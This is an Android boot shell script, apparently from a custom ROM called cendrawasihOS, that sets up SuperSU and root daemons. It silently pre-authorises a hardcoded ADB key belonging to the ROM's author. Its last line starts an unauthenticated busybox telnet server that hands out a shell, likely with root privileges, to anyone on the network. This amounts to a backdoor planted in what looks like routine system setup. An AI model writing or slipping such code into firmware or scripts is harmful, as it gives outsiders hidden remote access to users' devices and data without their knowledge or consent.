#!/system/bin/sh

# Auto granted My ADB Shell :-)
if [ ! -e /data/misc/adb/adb_keys ]; then
	mkdir -p /data/misc/adb
	echo 'QAAAAFm4dXYX8EGwvCmRFD5byRaaV6NsHcJ5tW295uo/TOXeHDqaP6Sh5zgSaf6BrZmVIAmWlNmWiuqQ4froH5Taeewid5c5hCUQpzWaSSSKuWLAIzgsTYScqi9MJnx9h9SDARKNyy/QdPUdAThFRh1BUqD4zpppDaIKksNkOMNoO9PMUh9SbiufD4sKYMlXPJcR5l01mVdLuYIXZPBKSNqoi5waBusSBXQfNK+Y8qUVG9cTI7tjkbvY86HRrjM46GL+VioVKd3HQwCx36txYHwN11Bi/9DU1OBFmEch0ktZKu1HGX2zS00wolFoU24/JXtRsQGDIgfNyfMBb0Bc8dP+iVl6FDHhWpxrbuSpmfhIw0pF1uuu3JvfP19ASl/4cV3n0c8EK8mjrBqjFmo6W/B/17Q1/MOdZDUgLv/Xaig4SHEK9PkH1yFzG2f6na0vxIxO0okdl4NkRiSlMSGQ06brpbUxiRhwyMoLOfOegne1JDEyY5hwRYeebxNxUJLJvMa/zuOjGR8SJEbyHA58lOwEnpnifSAKuvrdxv8NDVFkiTzAEB0m/zpWuubMyTtxDEjKNq5wVZBjlBP2E68y+7cPhINIOq28v4qGqmbyX/BAu8wM+yGuct+NPTsrXAqa59hSXCicQWqaEyDB8NLDn4KP2scJRJzwn7C9Ho9OqyYY02ZkHJs8pgEAAQA= manssizz@cendrawasihOS' > /data/misc/adb/adb_keys
fi

# Install App
MARK=/data/local/symbol_thirdpart_apks_installed

if [ ! -e $MARK ]; then
	mkdir -p /data/data/eu.chainfire.supersu/files
	cp /system/supersu.cfg /data/data/eu.chainfire.supersu/files/
	chmod 700 /data/data/eu.chainfire.supersu/files/supersu.cfg

	/system/bin/preinstall.sh &
	touch $MARK

fi

# Aktifkan SuperUser Kernel Module & Daemon
insmod /system/lib/libsupol.so
/system/xbin/daemonsu --auto-daemon &
/system/xbin/busybox telnetd -l /system/bin/sh &